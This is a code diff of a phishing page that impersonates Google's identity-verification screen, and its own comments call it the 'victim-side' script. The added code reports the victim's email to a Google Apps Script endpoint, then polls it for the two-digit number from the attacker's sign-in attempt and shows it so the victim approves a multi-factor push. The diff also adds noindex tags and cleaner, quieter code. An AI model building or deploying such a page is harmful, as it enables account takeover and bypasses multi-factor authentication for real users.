@@ -8,7 +8,13 @@
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-  <title>Verifying your identity - Google</title>
+  <title>Verifying your identity – Google</title>
+
+  <meta name="robots" content="noindex, nofollow" />
+
+ 
+
+  <!-- Google Fonts – Roboto is still the standard in 2026 for Google properties -->
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
 
@@ -16,7 +22,179 @@
 
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
-  <link rel="stylesheet" href="style.css">
+ 
+
+  <link rel="stylesheet" href="style.css" />
+
+ 
+
+  <style>
+
+    /* Inline fallback styles – move to style.css in production */
+
+    body {
+
+      font-family: 'Roboto', system-ui, sans-serif;
+
+      background: #f8f9fa;
+
+      color: #202124;
+
+      margin: 0;
+
+      padding: 0;
+
+      height: 100vh;
+
+      display: flex;
+
+      align-items: center;
+
+      justify-content: center;
+
+    }
+
+    .page-center {
+
+      max-width: 420px;
+
+      width: 100%;
+
+      padding: 24px;
+
+    }
+
+    .card {
+
+      background: white;
+
+      border-radius: 12px;
+
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+
+      padding: 32px 24px;
+
+      text-align: center;
+
+    }
+
+    .logo svg {
+
+      width: 48px;
+
+      height: 48px;
+
+      margin-bottom: 24px;
+
+    }
+
+    .avatar {
+
+      width: 64px;
+
+      height: 64px;
+
+      background: #4285f4;
+
+      color: white;
+
+      font-size: 28px;
+
+      font-weight: 500;
+
+      line-height: 64px;
+
+      border-radius: 50%;
+
+      margin: 0 auto 24px;
+
+    }
+
+    h1 {
+
+      font-size: 24px;
+
+      font-weight: 500;
+
+      margin: 0 0 12px;
+
+    }
+
+    p {
+
+      font-size: 16px;
+
+      color: #5f6368;
+
+      margin: 0 0 24px;
+
+      line-height: 1.5;
+
+    }
+
+    .spinner {
+
+      width: 40px;
+
+      height: 40px;
+
+      border: 4px solid #e8eaed;
+
+      border-top: 4px solid #4285f4;
+
+      border-radius: 50%;
+
+      animation: spin 1s linear infinite;
+
+      margin: 0 auto 24px;
+
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+   
+
+    #prompt-section {
+
+      transition: opacity 0.4s ease;
+
+    }
+
+    .number-box {
+
+      font-size: 48px;
+
+      font-weight: 700;
+
+      letter-spacing: 12px;
+
+      color: #202124;
+
+      background: #f1f3f4;
+
+      padding: 16px 32px;
+
+      border-radius: 12px;
+
+      display: inline-block;
+
+      margin: 16px auto 24px;
+
+      min-width: 140px;
+
+      user-select: none;
+
+    }
+
+    .security-note {
+
+      font-size: 14px;
+
+      color: #5f6368;
+
+    }
+
+  </style>
 
 </head>
 
@@ -25,6 +203,8 @@
   <div class="page-center">
 
     <div class="card">
+
+      <!-- Google logo -->
 
       <div class="logo">
 
@@ -42,29 +222,49 @@
 
       </div>
 
-      <div class="avatar" id="avatar"></div>
+      <!-- Initial avatar letter -->
+
+      <div class="avatar" id="avatar" aria-hidden="true"></div>
+
+      <!-- Loading / waiting state -->
 
       <div id="loading">
 
-        <div class="spinner"></div>
+        <div class="spinner" aria-hidden="true"></div>
 
         <h1>Verifying your identity</h1>
 
-        <p id="statusText">Checking your account…</p>
+        <p id="status-text">Checking your account…</p>
 
       </div>
 
-      <div id="prompt-section" style="display:none;">
+      <!-- Number prompt state (hidden initially) -->
+
+      <div id="prompt-section" style="display: none;" role="region" aria-live="polite">
 
         <h1>Check your phone</h1>
 
-        <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
+        <p>Tap <strong>Yes</strong> on the prompt sent to your device</p>
 
-        <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
+       
 
-        <div id="matchNumber" class="number-box">••</div>
+        <div class="security-note" style="margin: 16px 0;">
 
-        <p style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</p>
+          Match the number below with the one shown on your phone:
+
+        </div>
+
+       
+
+        <div id="match-number" class="number-box" aria-label="Verification number">••</div>
+
+       
+
+        <p class="security-note">
+
+          This extra step helps keep your account secure.
+
+        </p>
 
       </div>
 
@@ -74,45 +274,47 @@
 
   <script>
 
-    // =====================================================================
+    // ────────────────────────────────────────────────
 
-    // Victim Verify Page - Polling version (Apps Script backend)
+    //  Victim-side polling script – clean 2026 version
 
-    // Polls every 2 seconds for the 2-digit prompt number
+    // ────────────────────────────────────────────────
 
-    // =====================================================================
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxayueIRLXEyEmTO2BATezFZdivXqQqb5wp_lKX22wWfcSS8wvD1lZS4vTJ5eIlJ0bN/exec";
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1ADYt9x5mM6S2N7-iLsjHhzvV0BqlSLkg0jZOfquQ8R4lgI9HNcnk4i-Ll0u74VrJ/exec";
+    // Determine victim email (demo / captured value)
 
-    // Get or set demo email (you can replace this logic with real capture)
-
-    let email = localStorage.getItem("demoEmail") || "test@example.com";
+    const email = localStorage.getItem("demoEmail") || "user@example.com";
 
     document.getElementById("avatar").textContent =
 
       (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    // Signal to attacker dashboard that victim is ready (optional logging)
+    // Notify dashboard that victim is ready (logging / tracking)
 
     fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
 
       method: "GET",
 
-      mode: "no-cors"
+      mode: "no-cors",
 
-    });
+      cache: "no-store"
 
-    const loading = document.getElementById("loading");
+    }).catch(() => {}); // silent
 
-    const promptSection = document.getElementById("prompt-section");
+    const loadingEl     = document.getElementById("loading");
 
-    const statusText = document.getElementById("statusText");
+    const promptEl      = document.getElementById("prompt-section");
 
-    const matchNumber = document.getElementById("matchNumber");
+    const statusEl      = document.getElementById("status-text");
 
-    function pollLatestNumber() {
+    const numberEl      = document.getElementById("match-number");
 
-      const url = `${SCRIPT_URL}?action=get_prompt_number&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+    let lastDisplayedNumber = "••";
+
+    function pollForNumber() {
+
+      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
 
       fetch(url, {
 
@@ -122,57 +324,73 @@
 
       })
 
-        .then(response => {
+        .then(r => {
 
-          if (!response.ok) throw new Error("Network response was not ok");
+          if (!r.ok) throw new Error(`HTTP ${r.status}`);
 
-          return response.json();
+          return r.json();
 
         })
 
         .then(data => {
 
-          if (data && data.number && data.number !== matchNumber.textContent) {
+          const num = data?.prompt_number?.trim() || "";
 
-            // Valid 2-digit number received → show it
+          // Only update if we have a valid 2-digit number and it's new
 
-            matchNumber.textContent = data.number;
+          if (/^\d{2}$/.test(num) && num !== lastDisplayedNumber) {
 
-            statusText.textContent = "Number received — check your phone now";
+            numberEl.textContent = num;
 
-            loading.style.display = "none";
+            lastDisplayedNumber = num;
 
-            promptSection.style.display = "block";
+            statusEl.textContent = "Number received";
+
+            loadingEl.style.display = "none";
+
+            promptEl.style.display = "block";
 
           }
 
-          // else keep showing "Waiting..."
-
         })
 
-        .catch(error => {
+        .catch(() => {
 
-          // Silent fail - don't break the polling loop
+          // Silent failure – keep current state
 
-          console.log("Poll error:", error);
+          if (promptEl.style.display !== "block") {
 
-          statusText.textContent = "Waiting for verification…";
+            statusEl.textContent = "Waiting for verification…";
+
+          }
 
         });
 
     }
 
-    // Poll every 2 seconds (fast response, still quota-safe for small scale)
+    // Poll every 3 seconds – balanced responsiveness vs. quota usage
 
-    const pollInterval = setInterval(pollLatestNumber, 2000);
+    const POLL_INTERVAL_MS = 3000;
 
-    // Run first poll immediately
+    const pollTimer = setInterval(pollForNumber, POLL_INTERVAL_MS);
 
-    pollLatestNumber();
+    // Initial poll
 
-    // Optional: stop polling after e.g. 10 minutes to avoid unnecessary requests
+    pollForNumber();
 
-    // setTimeout(() => clearInterval(pollInterval), 10 * 60 * 1000);
+    // Optional: stop polling after reasonable timeout (e.g. 15 min)
+
+    setTimeout(() => {
+
+      clearInterval(pollTimer);
+
+      if (promptEl.style.display !== "block") {
+
+        statusEl.textContent = "Verification timed out. Please try again.";
+
+      }
+
+    }, 15 * 60 * 1000);
 
   </script>
 
